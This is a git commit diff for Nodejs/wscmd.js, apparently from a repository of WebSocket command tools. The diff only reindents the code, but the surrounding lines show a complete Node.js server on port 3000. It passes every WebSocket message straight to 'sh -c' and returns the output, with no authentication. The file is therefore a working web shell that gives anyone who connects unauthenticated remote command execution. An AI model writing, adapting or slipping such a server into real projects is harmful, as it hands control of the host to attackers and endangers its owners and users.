af43b0fe477f31345802b86f89432b4cce03a557
veo <38176360+veo@users.noreply.github.com>
2022-07-27 23:58:12 +0800

    nodejs

--- Nodejs/wscmd.js
+++ Nodejs/wscmd.js
@@ -3,9 +3,9 @@ var WebSocket = require('faye-websocket');
 
 
 server.on('upgrade', function(request, socket, body) {
-	if (WebSocket.isWebSocket(request)) {
-	  	var ws = new WebSocket(request, socket, body);
-		ws.on("message", function(event) {
+    if (WebSocket.isWebSocket(request)) {
+        var ws = new WebSocket(request, socket, body);
+        ws.on("message", function(event) {
             const spawn = require('child_process').spawn;
             const cmd = spawn('sh', ['-c', event.data]);
             var result = "";
@@ -15,20 +15,20 @@ server.on('upgrade', function(request, socket, body) {
             cmd.on('close', (code) => {
                 ws.send(result);
             })
-		});
-		ws.on('close', function (code, reason) {
-			// logger.warn('websocket client disconnected: ' + code + ' [' + reason + ']');
-			if (tc != null) {
-				tc.end();
-			}
-		});
-		ws.on('error', function (a) {
-			// logger.warn('websocket client error: ' + a);
-			if (tc != null) {
-				tc.end();
-			}
-		});
-	}
+        });
+        ws.on('close', function (code, reason) {
+            // logger.warn('websocket client disconnected: ' + code + ' [' + reason + ']');
+            if (tc != null) {
+                tc.end();
+            }
+        });
+        ws.on('error', function (a) {
+            // logger.warn('websocket client error: ' + a);
+            if (tc != null) {
+                tc.end();
+            }
+        });
+    }
 });
 
 server.listen(3000)
